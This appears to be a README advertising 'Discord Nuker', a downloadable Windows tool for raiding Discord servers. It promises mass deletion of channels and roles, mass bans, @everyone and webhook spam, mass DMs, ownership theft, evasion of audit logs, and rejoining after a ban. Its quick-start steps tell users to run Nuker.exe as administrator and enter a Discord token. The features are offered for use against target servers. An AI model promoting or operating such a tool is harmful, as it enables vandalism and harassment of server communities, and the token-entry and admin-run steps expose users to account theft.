# 🔥 Discord Nuker – Advanced Server Control Tool

> **⚠️ IMPORTANT: You MUST extract the entire archive before running Nuker.exe. Do NOT run the application directly from the ZIP file. Extract all files to a folder first!**

A powerful, feature-rich Discord server management tool designed for mass operations, server cleanup, and automated control. Everything runs from one clean interface with live statistics and real-time logging.

## 📸 Interface Preview

![Nuker Control Panel](https://imgur.com/QoMo0yF)

## ⚡ Features

### 📊 Overview
- **Server Selector** – Choose the target server for all actions
- **Live Stats Tiles:**
  - Servers – how many servers the bot is in
  - Members – member count of the selected server
  - Channels – channel count of the selected server
  - Gateway – current connection ping in ms

### 💥 Nuke
- Channels – delete every channel
- Roles – delete every role below the bot
- Members – kick every member
- Stickers – remove all stickers
- Emojis – remove all emojis
- Invites – revoke all invite links
- **Nuke everything** – runs all of the above in one click

### ⚔️ Raid
- Ban all
- Kick all
- Delete webhooks
- Mass rename
- Mention spam
- Lock server
- **God Mode:**
  - Grant admin bypass
  - Force self admin
  - Disable AutoMod
  - Steal ownership
  - Clone server
  - Freeze server
- **Vanity claim** – grab a custom discord.gg/... invite

### 📨 Spam
- **Count** – how many channels to create (up to 500)
- **Name** – fixed channel name, or random if left empty
- **@everyone every N s** – optional ping in each new channel
- **Message** – text posted 1:1 into every channel

### 🔗 Webhooks
- **Webhook spam** – blast a single webhook URL
  - Inputs: webhook URL, messages, threads, delay, content
- **Webhook create spam** – mass-create webhooks in a channel, then blast them
  - Inputs: number of webhooks, target channel, messages each, content

### 💬 Mass DM
- **Recipients** – all members, online only, or by role
- **Role** – target a specific role when selected
- **Delay per DM** – spacing between messages
- **Message** – text delivered to each member

### ⚙️ Settings
- Auto-nuke on join – wipe a server as soon as the bot joins
- Anti-bot filter – skip other bots and integrations
- Stealth delay – randomize timing to ease off rate limits
- Delete webhooks after spam – clean up created webhooks when done
- Undetected mode – keep actions out of the audit log
- Bypass verification – ignore the server verification gate
- Anti-ban – auto-reconnect if the bot is removed
- Rejoin loop – re-invite and repeat if kicked

### 📊 Activity
- **Active jobs** – live progress bars for nuke and spam runs
- **Live log** – real-time output of everything happening

## 📥 Installation

### System Requirements
- Windows 7/10/11
- .NET Framework 4.8 or higher
- Discord Bot Token or User Token with proper permissions

### Quick Start
1. Download the latest release from the [Releases](../../releases) page
2. **Extract the archive** – Right-click the `.zip` file and select "Extract All" (or use WinRAR/7-Zip)
3. Open the extracted folder
4. **Run `Nuker.exe` as administrator** – Right-click → "Run as administrator"
5. Enter your token when prompted
6. Select your target server from the dropdown
7. Choose your action and click execute

### Required Files
The package includes all necessary dependencies:
- `Nuker.exe` – Main application
- `msvcp140.dll` – Visual C++ runtime
- `vcruntime140.dll` – Visual C++ runtime
- `vcruntime140_1.dll` – Visual C++ runtime
- `tempdir.dll` – Temporary directory handler
- `bin/` – Additional runtime files
- `README.txt` – Quick reference guide

## 🚀 Usage

```bash
# 1. Extract the archive (MANDATORY)
unzip Discord-Nuker.zip -d ./Discord-Nuker/

# 2. Navigate to the extracted folder
cd Discord-Nuker

# 3. Run as administrator
Nuker.exe
